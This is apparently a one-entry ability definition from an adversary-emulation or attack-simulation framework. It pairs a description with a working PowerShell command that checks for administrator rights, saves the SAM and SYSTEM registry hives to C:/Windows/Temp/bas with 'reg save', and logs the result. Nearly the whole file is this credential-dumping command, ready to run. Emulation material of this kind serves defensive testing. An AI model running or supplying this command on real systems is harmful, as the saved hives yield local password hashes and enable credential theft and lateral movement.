ability.name: SAM and SYSTEM Registry Hive Extraction
ability.description: Extracts the SAM and SYSTEM registry hives to disk if operating with administrative privileges.

stages.command_template: $d='C:/Windows/Temp/bas'; if(!(Test-Path $d)){ni -ItemType Directory -Force $d|out-null}; $(try { $isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator); if ($isAdmin) { reg save HKLM\SAM $d/SAM /y; reg save HKLM\SYSTEM $d/SYSTEM /y; Write-Output "SAM and SYSTEM exported successfully." } else { Write-Output "ERROR: Non-admin session. Cannot perform SAM/SYSTEM registry save." } } catch { $_ }) | Tee-Object -FilePath $d/registry_dump.txt

rationale: Extracts local credentials from hives using native commands and standard single backslashes as requested, verifying administrator session context first.
